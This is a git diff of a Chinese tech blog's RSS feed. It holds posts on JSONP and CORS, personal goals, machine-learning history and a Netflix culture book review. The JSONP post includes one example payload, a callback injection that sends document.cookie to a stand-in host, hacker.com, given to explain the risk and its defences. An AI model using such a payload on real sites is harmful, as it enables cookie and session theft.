 &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addScriptTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'script'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;text/javascript&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
 &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;// 调用工具函数，发起请求，并告诉服务端，回调函数名字叫foo&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;addScriptTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://example.com/ip?callback=foo'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;addScriptTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://example.com/ip?callback=foo&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;// 服务端返回JSON格式的数据，并 放在一个叫 foo的函数调用的入参里，如下：&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;// foo({&quot;ip&quot;: &quot;8.8.8.8&quot;});&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
@@ -99,7 +259,7 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 * 回调函数，服务端返回的内容，会回调这个函数，并且把数据作为参数传入，这样就实现了跨源数据共享的目的
 */&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Your public IP address is: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Your public IP address is: &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -125,12 +285,12 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 &lt;p&gt;因为，callback参数值会作为函数名传个服务器并传回来，在浏览器端执行，如果这个参数不是一个正常的函数名，而是一个表达式，甚至是一段脚本呢？就会有问题了。比如&lt;/p&gt;
 
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/pay?callback=&amp;lt;srcript&amp;gt;$.get(&quot;http://hacker.com?cookie=&quot;+document.cookie)&amp;lt;/script&amp;gt;'&lt;/span&gt; 
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/pay?callback=&amp;lt;srcript&amp;gt;$.get(&quot;http://hacker.com?cookie=&quot;+document.cookie)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;攻击者还可以构造一些更加精巧的callback内容，实现RFD攻击。&lt;/p&gt;
 
-&lt;p&gt;要防止这种攻击，第一步要做的就是对callback参数的内容做转义，第二是要对返回的内容设置&lt;code class=&quot;highlighter-rouge&quot;&gt;conten-type=application/json&lt;/code&gt; （不能被执行）而不是&lt;code class=&quot;highlighter-rouge&quot;&gt;application/javascript&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;要防止这种攻击，第一步要做的就是对callback参数的内容做转义，第二是要对返回的内容设置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;conten-type=application/json&lt;/code&gt; （不能被执行）而不是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/javascript&lt;/code&gt;。&lt;/p&gt;
 
 &lt;p&gt;想要更安全优雅的实现跨源资源共享该怎么办呢？其实早在2014年的时候w3c就通过了&lt;strong&gt;跨源资源共享（Cross-Origin Resource Sharing (CORS)）&lt;/strong&gt; 的标准。&lt;/p&gt;
 
@@ -140,11 +300,11 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 &lt;p&gt;最基本的实现CORS和把大象装冰箱一样，总共分三步：&lt;/p&gt;
 
-&lt;p&gt;1、浏览器发现是一个跨源请求，就在请求头上加一个字段&lt;code class=&quot;highlighter-rouge&quot;&gt;Origin&lt;/code&gt;；包括协议，域名，端口。告诉被请求的服务端说，我是谁。&lt;/p&gt;
+&lt;p&gt;1、浏览器发现是一个跨源请求，就在请求头上加一个字段&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Origin&lt;/code&gt;；包括协议，域名，端口。告诉被请求的服务端说，我是谁。&lt;/p&gt;
 
-&lt;p&gt;2、服务器收到请求，应该检查这个Origin是不是被允许的访问来源，如果是被允许的，则在响应头上加上&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;，这个值可以是一个具体的origin，也可是是&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;表示允许所有源访问。&lt;/p&gt;
+&lt;p&gt;2、服务器收到请求，应该检查这个Origin是不是被允许的访问来源，如果是被允许的，则在响应头上加上&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;，这个值可以是一个具体的origin，也可是是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;表示允许所有源访问。&lt;/p&gt;
 
-&lt;p&gt;3、浏览器收到服务器的响应，检查是否有&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;头，如果有，才能把具体的响应体返回给请求发送者，否则报错，告诉请求发起方&lt;code class=&quot;highlighter-rouge&quot;&gt;access blocked by CORS policy&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;3、浏览器收到服务器的响应，检查是否有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;头，如果有，才能把具体的响应体返回给请求发送者，否则报错，告诉请求发起方&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;access blocked by CORS policy&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;其实，我们发现，CORS虽然阻止了将响应返回个请求发送者，但实际上请求是有真的发送到服务端的！所以当我们在做服务端接口的时候，一定要注意先要检查请求的Origin，再决定是否做相应的动作。以免形成事实上的攻击。这个在nginx配置上一定要注意，不能无脑的反射Origin。&lt;/p&gt;
 
@@ -154,12 +314,12 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 &lt;p&gt;&lt;strong&gt;用cors发送cookie？&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;除了Allow Origin这种源的白名单机制，cors还可以通过cookie实现对用户的身份认证，在请求头上加上 &lt;code class=&quot;highlighter-rouge&quot;&gt;credentials: 'include'&lt;/code&gt; 可以让请求带上cookie发送， 为了安全考虑，cors规定如果用了，则&lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;必须指定具体的值，不能为&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;除了Allow Origin这种源的白名单机制，cors还可以通过cookie实现对用户的身份认证，在请求头上加上 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;credentials: &apos;include&apos;&lt;/code&gt; 可以让请求带上cookie发送， 为了安全考虑，cors规定如果用了，则&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;必须指定具体的值，不能为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;&lt;/p&gt;
 
 </description>
         <pubDate>Tue, 09 Jun 2020 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2020/06/09/cross_domain/</link>
-        <guid isPermaLink="true">http://laichendong.com/2020/06/09/cross_domain/</guid>
+        <link>http://localhost:4000/2020/06/09/cross_domain/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/06/09/cross_domain/</guid>
         
         <category>web</category>
         
@@ -234,8 +394,8 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 </description>
         <pubDate>Tue, 07 Jan 2020 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2020/01/07/mathematics/</link>
-        <guid isPermaLink="true">http://laichendong.com/2020/01/07/mathematics/</guid>
+        <link>http://localhost:4000/2020/01/07/mathematics/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/01/07/mathematics/</guid>
         
         <category>数学通识</category>
         
@@ -250,14 +410,14 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
         <title>2019-flags</title>
         <description>&lt;h3 id=&quot;自我成长&quot;&gt;自我成长：&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 报考清华经管MBA
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 报考清华经管MBA
 - 把自己变成AI人才，多写点代码？
 - 看书：月均1本
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;提升生活情趣&quot;&gt;提升生活情趣：&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 品味：保持工位，家里的干净整洁和美感
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 品味：保持工位，家里的干净整洁和美感
 - 画画：系统的学学素描，打型，多画
 - 摄影：多拍
 - 跑步：700/1000/1200   完成一次全马
@@ -266,20 +426,22 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 &lt;h3 id=&quot;责任&quot;&gt;责任：&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 小孩教育：小天小学， 小月幼儿园
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 小孩教育：小天小学， 小月幼儿园
 - 多陪家人
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;想给自己的礼物&quot;&gt;想给自己的礼物：&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- apple  Watch ： 4k
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- apple  Watch ： 4k
 - 适马 24-70 2.8   8k
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 </description>
         <pubDate>Fri, 29 Nov 2019 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2019/11/29/2020-flags/</link>
-        <guid isPermaLink="true">http://laichendong.com/2019/11/29/2020-flags/</guid>
+        <link>http://localhost:4000/2019/11/29/2020-flags/</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/11/29/2020-flags/</guid>
+        
+        <category>OKR</category>
         
         
       </item>
@@ -331,8 +493,8 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 </description>
         <pubDate>Wed, 06 Nov 2019 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2019/11/06/ddd/</link>
-        <guid isPermaLink="true">http://laichendong.com/2019/11/06/ddd/</guid>
+        <link>http://localhost:4000/2019/11/06/ddd/</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/11/06/ddd/</guid>
         
         <category>领域驱动设计</category>
         
@@ -387,208 +549,10 @@ http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
 
 </description>
         <pubDate>Tue, 17 Sep 2019 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2019/09/17/coaching_for_performance/</link>
-        <guid isPermaLink="true">http://laichendong.com/2019/09/17/coaching_for_performance/</guid>
+        <link>http://localhost:4000/2019/09/17/coaching_for_performance/</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/09/17/coaching_for_performance/</guid>
         
         <category>读书笔记</category>
-        
-        
-        <category>读书笔记</category>
-        
-      </item>
-    
-      <item>
-        <title>机器学习简史</title>
-        <description>&lt;hr /&gt;
-
-&lt;h1 id=&quot;一早期神经网络阶段&quot;&gt;一、早期神经网络阶段&lt;/h1&gt;
-
-&lt;h2 id=&quot;1949年--赫布理论&quot;&gt;1949年  赫布理论&lt;/h2&gt;
-
-&lt;p&gt;普遍ML被Hebb（赫布）提出，基于神经心理学的构想；&lt;/p&gt;
-
-&lt;h2 id=&quot;1952年arthur-samuel---亚瑟-萨缪尔--机器学习之父&quot;&gt;&lt;strong&gt;1952年，Arthur Samuel   亚瑟 萨缪尔  机器学习之父&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;在IBM的时候开发了一个玩跳棋的程序，该程序能够通过棋子的位置学习一个隐式模型，为下一步棋提供比较好的走法。 塞缪尔与这个程序对局了很多次，并观察到这个程序在经过一段时间的学习后可以发挥得更好。&lt;strong&gt;他给机器学习下了一个定义：机器学习是一个能使计算机不用显示编程就能获得能力的研究领域。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;1957年感知器模型被第二次提出&quot;&gt;1957年，感知器模型被第二次提出&lt;/h2&gt;
-
-&lt;p&gt;Rosenblatt的基于神经科学背景（基础）的感知器模型被第二次提出，并且取得了一定的发展&lt;/p&gt;
-
-&lt;h2 id=&quot;1969年minsky-提出异或问题神经网络遇到瓶颈&quot;&gt;1969年，Minsky 提出异或问题，神经网络遇到瓶颈，&lt;/h2&gt;
-
-&lt;p&gt;被Minsky 提出的异或困扰，神经网络 一下子沉寂了10年，到80年代才有所突破&lt;/p&gt;
-
-&lt;h2 id=&quot;1981年神经网络特定反向传播bp算法应用到多层感知器mlp&quot;&gt;1981年，神经网络特定反向传播（BP）算法应用到多层感知器（MLP）&lt;/h2&gt;
-
-&lt;p&gt;直到1981年，Werbos [6]才提出将神经网络特定反向传播（BP）算法应用到多层感知器（MLP）。BP仍然是当今神经网络架构的关键组成部分。有了这些新想法，神经网络的研究再次加速。1985年至1986年间，神经网络研究人员相继提出了采用BP训练多层感知器（MLP）的理念&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;二统计学习方法的春天&quot;&gt;二、统计学习方法的春天&lt;/h1&gt;
-
-&lt;h2 id=&quot;1986年决策树&quot;&gt;1986年，决策树&lt;/h2&gt;
-
-&lt;p&gt;另一个学派，在1986年，J.R.Quinlan 提出了另一个非常著名的ML算法，我们称之为&lt;strong&gt;决策树&lt;/strong&gt;，更具体地说是ID3算法。这是机器学习另一个主流的闪光点。此外，ID3能够以简单的规则及其明确的推论更好地应用到实际生活中，与黑匣子神经网络模型相反。在ID3之后，出现了很多不同的可用方案和算法改进（例如ID4，回归树，CART …），而且仍然是机器学习中的活跃话题之一。&lt;/p&gt;
-
-&lt;h2 id=&quot;1995年-svm&quot;&gt;1995年， SVM&lt;/h2&gt;
-
-&lt;p&gt;SVM具有非常强的理论论证和实证结果，在2000年左右，SVM内核化版本提出之后在很多之前用NN模型解决的问题上得出了最佳结果。 此外，与NN模型相比，SVM能够充分利用凸优化，泛化边际理论和内核化的所有深奥知识。 因此，它可以从不同学科中获得巨大的推动力，促进理论和实践的快速发展。&lt;/p&gt;
-
-&lt;h2 id=&quot;1997年adaboost&quot;&gt;1997年，Adaboost&lt;/h2&gt;
-
-&lt;p&gt;1997年提出了另一个实体机器学习模型，该模型采用增强的弱分类器组合，称为Adaboost，Adaboost通过易于训练的弱分类器进行训练，给那些难的样本更高的权重。这种模型是许多不同任务的基础，如面部识别和检测。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;三深度神经网络&quot;&gt;三、深度神经网络&lt;/h1&gt;
-
-&lt;h2 id=&quot;2005年深度学习崛起&quot;&gt;2005年，深度学习崛起&lt;/h2&gt;
-
-&lt;p&gt;NN 模型能够在对象识别、语音识别、NLP等不同的任务中击败之前的技术。但是应该注意的是，这并不意味着其他ML流派的结束。虽然深度学习的成功故事还在接二连三的上演，但是它在训练成本和调整模型的外部参数方面还有很多争议。此外，由于其简单性，SVM的使用依然非常普遍。&lt;/p&gt;
-
-&lt;h2 id=&quot;2012年cnn碾压svm从此统治ai界&quot;&gt;2012年，CNN碾压SVM，从此统治AI界&lt;/h2&gt;
-
-&lt;p&gt;Hinton课题组为了证明深度学习的潜力，首次参加ImageNet图像识别比赛，其通过构建的CNN网络&lt;strong&gt;AlexNet&lt;/strong&gt;一举夺得冠军，且碾压第二名（SVM方法）的分类性能。也正是由于该比赛，CNN吸引到了众多研究者的注意。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-</description>
-        <pubDate>Thu, 15 Aug 2019 00:00:00 +0800</pubDate>
-        <link>http://laichendong.com/2019/08/15/a-brief-history-of-machine-learning/</link>
-        <guid isPermaLink="true">http://laichendong.com/2019/08/15/a-brief-history-of-machine-learning/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Netfilx</title>
-        <description>&lt;p&gt;前段时间参加北京Qcon，听腾讯黄闻欣一个关于技术团队管理的分享。其中很多观点都深以为然，和我的理念也比较贴合。演讲中他多次提到一本叫《奈飞文化手册》的书，并要求加入到他团队的人员必读。能看出他的很多做法和理念有受这本书的影响。奈飞(netflix)这家公司早有耳闻，于是动了想看看这本书的想法。&lt;/p&gt;
-
-&lt;p&gt;Netflix是一个很牛逼的公司，成立20年，市值一千五百亿，和谷歌，Facebook，亚马逊并称美股四剑客。起初，Netflix只是一家做DVD租赁的小公司（我想很多80后小时候也用过这种服务吧），后来先后两次大转型成为视频分发公司和媒体内容创造公司成为今天的样子。这点我觉得和京东有些相似，京东最早是在中关村卖光盘的一个小柜台。后面转型成现在的综合电商。虽说一个企业的成功一定是系统性的成功，但企业的文化肯定是这个系统里非常重要的一个点。事实上，在本书出版之前，Netflix的企业文化就已经非常出名了。一份名为《奈飞文化集》的PPT早已在网络上流传，号称”硅谷最重要的文件”，下载量1500W(加上各种转发应该远大于这个值)。而这边书就是这份PPT的升级增强版本。更加系统的讲述了Netflix的8条文化准则。只是文化这种东西，从来都不能照搬照套，需要根据自身的情况，打造属于自己的文化。&lt;/p&gt;
-
-&lt;p&gt;一个企业(团队)的文化，从来不是挂在墙上或写在纸上的那些词，它存在于人们的心里。要弄清一个企业的文化到底是什么样，要看他如何招人，如何做事儿，如何给钱，也包括如何裁人！而奈飞的第一条文化准则就说&lt;strong&gt;“我们只招成年人”&lt;/strong&gt;，那何谓成年人呢？就是那些认为”&lt;strong&gt;最好的激励是和牛逼的人一起干牛逼的事儿”&lt;/strong&gt;的人，而不是那些觉得”Google食堂有顶级大厨”人。我认为很多公司，尤其是现在的互联网公司，在招聘广告上都过分强调”福利”的部分了。什么免费的咖啡，美味的食堂，高大上的健身房……而且还有更恶俗的”程序员鼓励师”。有没搞错，我是来工作的不是来逛街的。这些福利应该仅仅是锦上添花的那一朵小花而已。对于”成年人”来说，更吸引人的招聘广告是更明确的描述我们的团年度是做什么的，当前的遇到了什么样困难和挑战，需要拥有什么样的技能的人来一起攻克他。如果还有吸引的部分就是”用牛逼的人来吸引牛逼的人”。&lt;/p&gt;
-
-&lt;h2 id=&quot;铁打的营盘流水的兵&quot;&gt;铁打的营盘，流水的兵&lt;/h2&gt;
-
-&lt;p&gt;和google的要招全世界最顶尖的人（用java是吧，那java语言的发明者，请到碗里来）不同，Netflix显得更加实用主义一些，招和岗位最匹配的人（”不是每个岗位都需要爱因斯坦”），并给他在这个岗位上市场的最高工资。如果实在不能支撑让所有人都拿到市场上最高的工资，那至少让关键岗位上的人拿到。关于薪水这个敏感话题，本书专门拿出一个准则来阐述了奈飞的独特做法”&lt;strong&gt;按照员工带来的价值付薪&lt;/strong&gt;“，这是一个很容易让员工个体看的热血沸腾的准则，具体包含”不要让员工在不得不离开时才获得应得的薪水”，”保证每个人都获得市场最高水平的薪水”，”告别密薪制，薪酬透明有助于市场定价”，“不论奈飞的业绩好坏，我们都按照市场顶级水平付薪”。这些行为在国内（国外价值观怎么样不知道~）的大部分人看来都甚是疯狂！作为国内大公司里的基层管理者，我认为实现这种机制的环境短时间内不会到来，所以对此我们先按下不表。不过值得一提的是，天下没有免费的午餐，在奈飞提供高薪的前提下，他对员工的要求也是很高的，如果你和当前岗位不是高度匹配的状态的话是要”被干掉”的。这就是上面说的，铁打的营盘，流水的兵。兵的流水，是为了营盘的铁打。这点和华为的理念很像。比如华为认为人力资源管理是为了保持组织活力，45岁就要退休等等，联想到华为的奋斗者协议和高工资，感觉这两家公司还真的是有很多相似之处。&lt;strong&gt;兵的流水，保证在营盘里的兵都是最合适的好兵，从而保证营盘是铁打的，因为营盘是铁打的，又能吸引更多的好兵流入&lt;/strong&gt;。这就是奈飞们的逻辑吧。奈飞明确提出”&lt;strong&gt;你建立的是团队，不是家庭&lt;/strong&gt;”“&lt;strong&gt;招聘谁和干掉谁的决定必须完全建立在团队绩效的基础上。&lt;/strong&gt;“企业需要流水兵还有一个重要原因是”&lt;strong&gt;企业在不同的阶段需要不同的员工&lt;/strong&gt;“，比如在初创阶段，需要的是快速试错，强执行，多面手这些都很适合。但是企业大了之后，试错成本越来越高；业务和系统越来越复杂，头痛医头脚痛医脚的方式也会越来越带来混乱和不可持续。需要更多的规划和抽象，最近正火的”中台战略”就来自于此。&lt;/p&gt;
-
-&lt;h2 id=&quot;值得借鉴的一些实践&quot;&gt;值得借鉴的一些实践&lt;/h2&gt;
-
-&lt;h3 id=&quot;永远在招聘&quot;&gt;永远在招聘&lt;/h3&gt;
-
-&lt;p&gt;有说”管理是通过别人去取得结果的过程”，这里有两个变量，一个是你要取的结果是什么，一个是你通过什么样的人去取得。奈飞鼓励”&lt;strong&gt;现在就开始组建你未来需要的团队&lt;/strong&gt;“。你要做什么事儿，取得什么样的结果决定了你要什么样的人和多少人。我们通常发现这样的现象，一个人会问另一个管理者：”你带多少人啊？”潜台词就是管的人越多就越厉害，于是管理者就有不断扩张自己团队成员数量的欲望。而奈飞告诫说”不要让招聘成为一场数字游戏”，而是要持续的面向未来去规划所需要的团队。站在6个月之后，审视现在的团队，要做哪些准备，招什么样的人。这就要求我们能够”永远在招聘”，公司有”不定期的招聘开窗期”是非常可怕的。一方面，遇见需要的优秀人员时可能因为不在开窗期而不能及时招入，另一方面，出于这种担心，管理者会在开窗期招入很多”还凑活”的人进来，这会极大的稀释团队的人才密度。&lt;/p&gt;
-
